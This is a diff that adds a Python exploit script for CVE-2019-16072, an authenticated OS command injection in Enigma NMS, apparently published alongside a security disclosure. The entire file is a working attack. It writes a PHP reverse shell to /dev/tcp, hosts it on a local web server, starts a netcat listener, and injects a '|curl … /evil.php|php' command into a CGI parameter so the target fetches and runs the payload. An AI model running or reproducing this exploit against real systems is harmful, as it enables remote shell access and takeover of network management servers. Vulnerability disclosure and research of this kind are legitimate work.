@@ -1,0 +1,66 @@
+#!/usr/bin/python
+#--------------------------------------------------------------------#
+# Exploit Title: Enigma NMS OS Command Injection                     #
+# NETSAS Pty Ltd Enigma NMS                                          #
+# Date:  21 July 2019                                                #
+# Author: Mark Cross (@xerubus | mogozobo.com)                       #
+# Vendor: NETSAS Pty Ltd                                             #
+# Vendor Homepage:  https://www.netsas.com.au/                       #
+# Software Link: https://www.netsas.com.au/enigma-nms-introduction/  #
+# Version: Enigma NMS 65.0.0                                         #
+# CVE-IDs: CVE-2019-16072                                            #
+# Full write-up: https://www.mogozobo.com/?p=3647                    #
+#--------------------------------------------------------------------#
+
+import sys, time, os, subprocess, signal, requests, socket, SocketServer, SimpleHTTPServer, threading
+
+os.system('clear')
+
+print("""\
+        _  _
+  ___ (~ )( ~)
+ /   \_\ \/ /   
+|   D_ ]\ \/  -= Enigma NMS Reverse Shell by @xerubus =-    
+|   D _]/\ \     -= We all have something to hide =-
+ \___/ / /\ \\
+      (_ )( _)
+      @Xerubus    
+                    """)
+
+enigma_host = raw_input("Enter Enigma NMS IP address:\t")
+attack_host = raw_input("Enter Attacker IP address:\t")
+rev_sh_port = raw_input("Enter reverse shell port:\t")
+web_svr_port = raw_input("Enter web server port:\t\t")
+user = raw_input("Enter Username:\t\t\t")
+os.system("stty -echo")
+password = raw_input("Enter Password (no echo):\t")
+os.system("stty echo")
+	
+enigma_url = "http://" + enigma_host + "/cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|curl%20" + attack_host + ":" + web_svr_port + "/evil.php|php&snmp_ro_string=public&mib_oid=system&mib_oid_manual=.1.3.6.1.2.1.1&snmp_version=1"
+enigma_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://" + attack_host + "/cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+
+print "\n\n[+] Building PHP reverse shell"
+f=open("evil.php","w")
+f.write("<?php\nexec(\"/bin/bash -c \'bash -i >& /dev/tcp/" + attack_host + "/" + rev_sh_port + " 0>&1\'\");\n?>\n")
+f.close()
+
+# Create simple webserver hosting evil php file
+print "[+] Hosting PHP reverse shell"
+web_svr_port = str(web_svr_port)
+web_svr = subprocess.Popen(["python", "-m", "SimpleHTTPServer", web_svr_port], stdout=subprocess.PIPE, shell=False, preexec_fn=os.setsid)
+
+# Create netcat listener
+print "[+] Creating listener on port " + rev_sh_port
+subprocess.Popen(["nc", "-nvlp", rev_sh_port])
+
+# Send payload to Enigma NMS
+print "[+] Sending payload\n"
+try:
+    r = requests.get(enigma_url, headers=enigma_headers, auth=(user, password))
+except:
+    pass
+
+print "\n[+] Cleaning up mess..." 
+
+# Shut down http server
+os.killpg(os.getpgid(web_svr.pid), signal.SIGTERM)
